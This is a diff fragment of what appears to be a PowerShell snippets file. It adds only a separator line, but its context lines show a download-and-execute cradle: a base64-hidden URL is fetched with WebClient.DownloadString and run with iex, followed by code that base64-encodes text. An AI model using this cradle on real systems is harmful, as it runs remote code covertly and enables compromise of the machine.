@@ -53,6 +53,7 @@ $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64
 $pepe = (New-Object net.webclient).DownloadString($decode)
 iex $pepe
 -----
+---------
 $text = "hola muindo"
 $bytes =  [System.Text.Encoding]::Unicode.GetBytes($text)
 $EncodedText = [Convert]::ToBase64String($Bytes)
